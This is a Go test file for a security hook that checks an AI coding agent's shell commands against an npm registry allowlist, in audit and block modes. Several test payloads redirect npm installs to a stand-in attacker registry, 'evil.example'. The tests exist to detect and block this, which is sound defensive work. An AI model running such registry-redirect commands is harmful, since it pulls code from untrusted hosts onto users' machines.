package hook

import (
	"bytes"
	"context"
	"encoding/json"
	"strings"
	"testing"
	"time"

	cc "github.com/step-security/dev-machine-guard/internal/aiagents/adapter/claudecode"
	"github.com/step-security/dev-machine-guard/internal/aiagents/event"
	"github.com/step-security/dev-machine-guard/internal/aiagents/policy"
	"github.com/step-security/dev-machine-guard/internal/executor"
)

// builtinAllowedRegistry mirrors the single-element allowlist shipped in
// internal/aiagents/policy/builtin/policy.json. The hook now enforces the
// embedded policy unconditionally, so tests assert against that allowlist
// directly.
const builtinAllowedRegistry = "https://registry.stepsecurity.io/"

func runWith(t *testing.T, payload string, hookType event.HookEvent) (map[string]any, *event.Event) {
	t.Helper()
	return runWithPolicy(t, payload, hookType, nil)
}

func runWithPolicy(t *testing.T, payload string, hookType event.HookEvent, pol *policy.Policy) (map[string]any, *event.Event) {
	t.Helper()
	stdin := strings.NewReader(payload)
	var stdout, stderr bytes.Buffer
	cap := &captured{}
	rt := &Runtime{
		Adapter:     cc.New(t.TempDir(), "/usr/local/bin/stepsecurity-dev-machine-guard"),
		Exec:        executor.NewMock(),
		Stdin:       stdin,
		Stdout:      &stdout,
		Stderr:      &stderr,
		Now:         func() time.Time { return time.Now().UTC() },
		Policy:      pol,
		UploadEvent: cap.capture(),
		LogError:    cap.logError(),
	}
	_ = rt.Run(context.Background(), hookType)
	var resp map[string]any
	if err := json.Unmarshal(bytes.TrimSpace(stdout.Bytes()), &resp); err != nil {
		t.Fatalf("stdout not JSON: %v: %q", err, stdout.Bytes())
	}
	if len(cap.events) == 0 {
		return resp, nil
	}
	ev := cap.events[0]
	return resp, &ev
}

// blockModePolicy returns a copy of the embedded policy with mode=block.
func blockModePolicy() *policy.Policy {
	p := policy.Builtin()
	p.Mode = policy.ModeBlock
	return &p
}

// expectAllowResponse asserts the wire-format is allow.
func expectAllowResponse(t *testing.T, resp map[string]any) {
	t.Helper()
	if resp["continue"] != true {
		t.Errorf("expected continue=true, got %v", resp)
	}
	if _, ok := resp["decision"]; ok {
		t.Errorf("allow response must not carry decision field, got %v", resp)
	}
}

// expectBlockResponse asserts the spec-compliant PreToolUse block shape:
// hookSpecificOutput.permissionDecision="deny" plus a generic reason.
// MUST NOT contain continue:false (which would halt the agent entirely)
// nor the deprecated top-level decision/reason/stopReason fields.
func expectBlockResponse(t *testing.T, resp map[string]any) {
	t.Helper()
	if v, ok := resp["continue"]; ok && v == false {
		t.Errorf("block response must not emit continue:false (halts agent), got %v", resp)
	}
	for _, k := range []string{"decision", "reason", "stopReason"} {
		if _, ok := resp[k]; ok {
			t.Errorf("block response must not carry deprecated field %q, got %v", k, resp)
		}
	}
	hso, ok := resp["hookSpecificOutput"].(map[string]any)
	if !ok {
		t.Fatalf("block response missing hookSpecificOutput: %v", resp)
	}
	if hso["hookEventName"] != "PreToolUse" {
		t.Errorf("hookEventName: %v", hso["hookEventName"])
	}
	if hso["permissionDecision"] != "deny" {
		t.Errorf("permissionDecision: %v", hso["permissionDecision"])
	}
	reason, _ := hso["permissionDecisionReason"].(string)
	if !strings.Contains(reason, "Blocked by your organization") {
		t.Errorf("permissionDecisionReason not generic block message: %v", reason)
	}
}

// Test 1: Built-in policy defaults to audit; a violation persists a finding
// and emits an allow response (Allowed reflects the effective response).
func TestAuditDefaultRegistryFlagViolationAllowsAndAudits(t *testing.T) {
	resp, ev := runWith(t, `{"tool_name":"Bash","tool_input":{"command":"npm install --registry=https://evil.example/ lodash"}}`, event.HookPreToolUse)

	expectAllowResponse(t, resp)

	pd := ev.PolicyDecision
	if pd == nil {
		t.Fatalf("policy_decision missing: %+v", ev)
	}
	if pd.Mode != "audit" {
		t.Errorf("mode: %v", pd.Mode)
	}
	if !pd.Allowed {
		t.Errorf("audit-mode allowed must reflect effective response (true), got %v", pd.Allowed)
	}
	if !pd.WouldBlock {
		t.Errorf("would_block: %v", pd.WouldBlock)
	}
	if pd.Enforced {
		t.Errorf("enforced must be false in audit mode, got %v", pd.Enforced)
	}
	if pd.Bypass != "registry_flag" {
		t.Errorf("bypass: %v", pd.Bypass)
	}
	if !strings.Contains(pd.InternalDetail, "evil.example") {
		t.Errorf("internal_detail should name the registry: %v", pd.InternalDetail)
	}
	// Audit-mode wire response is allow; no place for detail to leak.
	if _, ok := resp["hookSpecificOutput"]; ok {
		t.Errorf("audit-mode response must not carry hookSpecificOutput, got %v", resp)
	}
}

// Test 2: Audit-mode managed-key mutation persists a finding and allows.
func TestAuditDefaultManagedKeyMutationAllowsAndAudits(t *testing.T) {
	resp, ev := runWith(t, `{"tool_name":"Bash","tool_input":{"command":"npm config set registry https://evil.example/"}}`, event.HookPreToolUse)

	expectAllowResponse(t, resp)

	pd := ev.PolicyDecision
	if pd == nil {
		t.Fatalf("policy_decision missing: %+v", ev)
	}
	if !pd.Allowed {
		t.Errorf("audit-mode allowed: %v", pd.Allowed)
	}
	if !pd.WouldBlock {
		t.Errorf("would_block: %v", pd.WouldBlock)
	}
	if pd.Mode != "audit" {
		t.Errorf("mode: %v", pd.Mode)
	}
}

// Test 3: Block-mode registry violation persists enforced=true and emits block.
func TestBlockModeRegistryFlagViolationBlocks(t *testing.T) {
	resp, ev := runWithPolicy(t, `{"tool_name":"Bash","tool_input":{"command":"npm install --registry=https://evil.example/ lodash"}}`, event.HookPreToolUse, blockModePolicy())

	expectBlockResponse(t, resp)
	leak := func(s string) bool {
		return strings.Contains(s, "evil.example") || strings.Contains(s, "lodash") || strings.Contains(s, "npmrc")
	}
	hso, _ := resp["hookSpecificOutput"].(map[string]any)
	pdr, _ := hso["permissionDecisionReason"].(string)
	if leak(pdr) {
		t.Errorf("block-mode permissionDecisionReason leaked detail: %q", pdr)
	}

	pd := ev.PolicyDecision
	if pd == nil {
		t.Fatalf("policy_decision missing: %+v", ev)
	}
	if pd.Mode != "block" {
		t.Errorf("mode: %v", pd.Mode)
	}
	if pd.Allowed {
		t.Errorf("block-mode allowed must reflect effective response (false), got %v", pd.Allowed)
	}
	if !pd.WouldBlock {
		t.Errorf("would_block: %v", pd.WouldBlock)
	}
	if !pd.Enforced {
		t.Errorf("enforced: %v", pd.Enforced)
	}
	if pd.Bypass != "registry_flag" {
		t.Errorf("bypass: %v", pd.Bypass)
	}
	if !strings.Contains(pd.InternalDetail, "evil.example") {
		t.Errorf("internal_detail should name the registry: %v", pd.InternalDetail)
	}
}

// Test 4: Block-mode managed-key mutation blocks.
func TestBlockModeManagedKeyMutationBlocks(t *testing.T) {
	resp, ev := runWithPolicy(t, `{"tool_name":"Bash","tool_input":{"command":"npm config set registry https://evil.example/"}}`, event.HookPreToolUse, blockModePolicy())

	expectBlockResponse(t, resp)

	pd := ev.PolicyDecision
	if pd == nil || !pd.Enforced || pd.Allowed {
		t.Errorf("expected enforced block, got %+v", pd)
	}
}

func TestPolicyUsesEnrichmentRegistry(t *testing.T) {
	rt := &Runtime{Policy: blockModePolicy()}
	ev := &event.Event{
		HookEvent:  event.HookPreToolUse,
		ActionType: event.ActionCommandExec,
		Payload: map[string]any{
			"tool_input": map[string]any{"command": "npm install lodash"},
		},
		Enrichments: &event.Enrichments{
			PackageManager: &event.PackageManagerInfo{
				Detected:    true,
				Name:        "npm",
				CommandKind: "install",
				Registry:    "https://evil.example/",
			},
		},
	}

	info, decision := rt.evaluatePolicy(context.Background(), ev, "npm install lodash")

	if info == nil {
		t.Fatal("expected policy decision")
	}
	if info.Registry != "https://evil.example/" {
		t.Errorf("registry: %q", info.Registry)
	}
	if decision.Allow {
		t.Errorf("expected block decision")
	}
}

// A synthetic future-agent event that carries a non-Claude native hook
// name still evaluates policy because the gate is normalized over
// HookPhase. This pins the multi-agent invariant: policy never branches
// on agent-specific HookEvent values.
func TestPolicyGateUsesHookPhaseNotNativeName(t *testing.T) {
	rt := &Runtime{Policy: blockModePolicy()}
	cmd := "npm install --registry=https://evil.example/ x"
	ev := &event.Event{
		HookEvent:  "tool.execute.before", // not any Claude constant
		HookPhase:  event.HookPhasePreTool,
		ActionType: event.ActionCommandExec,
		Enrichments: &event.Enrichments{
			PackageManager: &event.PackageManagerInfo{
				Detected: true, Name: "npm", CommandKind: "install",
			},
		},
	}
	if !shouldEvaluatePolicy(ev, cmd) {
		t.Fatal("phase-based gate must pass for pre_tool + command_exec + cmd")
	}
	info, decision := rt.evaluatePolicy(context.Background(), ev, cmd)
	if info == nil || decision.Allow {
		t.Fatalf("expected block decision for phase-driven evaluation: info=%v decision=%v", info, decision)
	}

	// And the gate must reject events whose phase is wrong, even when the
	// shell command and action_type would otherwise fit.
	ev.HookPhase = event.HookPhasePostTool
	if shouldEvaluatePolicy(ev, cmd) {
		t.Errorf("post_tool phase must not trigger policy")
	}
}

// Test 5: Audit allowlisted flag → no violation; allowed:true, would_block:false.
func TestAuditAllowlistedFlagNoFinding(t *testing.T) {
	resp, ev := runWith(t, `{"tool_name":"Bash","tool_input":{"command":"npm install --registry=`+builtinAllowedRegistry+` lodash"}}`, event.HookPreToolUse)

	expectAllowResponse(t, resp)

	pd := ev.PolicyDecision
	if pd == nil || !pd.Allowed {
		t.Errorf("expected allowed=true on allowlisted flag, got %+v", pd)
	}
	if pd != nil && pd.WouldBlock {
		t.Errorf("would_block should be false, got %v", pd.WouldBlock)
	}
}

// Test 6: Disabled ecosystem emits no policy_decision (no noise).
func TestDisabledEcosystemSuppressesPolicyDecision(t *testing.T) {
	pol := policy.Builtin()
	npm := pol.Ecosystems[policy.EcosystemNPM]
	npm.Enabled = false
	pol.Ecosystems[policy.EcosystemNPM] = npm

	resp, ev := runWithPolicy(t, `{"tool_name":"Bash","tool_input":{"command":"npm install --registry=https://evil.example/ lodash"}}`, event.HookPreToolUse, &pol)

	expectAllowResponse(t, resp)
	if ev.PolicyDecision != nil {
		t.Errorf("disabled ecosystem must not emit policy_decision, got %+v", ev.PolicyDecision)
	}
}

// Test 7: PostToolUse never evaluates policy.
func TestPolicySkipsPostToolUse(t *testing.T) {
	resp, ev := runWith(t, `{"tool_name":"Bash","tool_input":{"command":"npm install --registry=https://evil.example/ lodash"}}`, event.HookPostToolUse)

	expectAllowResponse(t, resp)
	if ev.PolicyDecision != nil {
		t.Errorf("policy stage should not run for PostToolUse: %+v", ev.PolicyDecision)
	}
}

// Test 8: Unknown ecosystem produces no policy_decision.
func TestPolicySkipsUnknownEcosystem(t *testing.T) {
	resp, ev := runWith(t, `{"tool_name":"Bash","tool_input":{"command":"pip install foo"}}`, event.HookPreToolUse)

	expectAllowResponse(t, resp)
	if ev.PolicyDecision != nil {
		t.Errorf("policy_decision should not be present for unenforced ecosystem: %+v", ev.PolicyDecision)
	}
}

// Regression: when CLI arg disagrees with payload hook_event_name, the
// runtime must use one hook type for both policy evaluation and response
// rendering. The invoked CLI hook is authoritative; the payload mismatch
// is audit evidence only.
func TestHookEventNameMismatchKeepsPolicyAndResponseInSync(t *testing.T) {
	// CLI arg = PreToolUse, payload says PostToolUse. Since the invoked hook
	// is authoritative, block-mode policy should evaluate and block.
	payload := `{"hook_event_name":"PostToolUse","tool_name":"Bash","tool_input":{"command":"npm install --registry=https://evil.example/ lodash"}}`
	resp, ev := runWithPolicy(t, payload, event.HookPreToolUse, blockModePolicy())

	expectBlockResponse(t, resp)
	pd := ev.PolicyDecision
	if pd == nil || !pd.Enforced || pd.Allowed {
		t.Errorf("expected enforced policy decision, got %+v", pd)
	}
	// Mismatch annotation must be present in errors.
	found := false
	for _, e := range ev.Errors {
		if e.Code == "hook_event_name_mismatch" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected hook_event_name_mismatch error annotation, got errors=%+v", ev.Errors)
	}
}

// Audit-mode findings keep their detail in internal_detail (the audit
// channel) but the user-facing wire response never names the registry.
func TestAuditFindingDetailGoesToTelemetryNotWire(t *testing.T) {
	resp, ev := runWith(t, `{"tool_name":"Bash","tool_input":{"command":"npm install --registry=https://evil.example/ lodash"}}`, event.HookPreToolUse)

	expectAllowResponse(t, resp)

	// Wire response is allow with no detail.
	if _, ok := resp["hookSpecificOutput"]; ok {
		t.Errorf("allow response must not carry hookSpecificOutput, got %v", resp)
	}

	pd := ev.PolicyDecision
	if pd == nil || !strings.Contains(pd.InternalDetail, "evil.example") {
		t.Errorf("internal_detail must record the violating registry for audit: %+v", pd)
	}
}
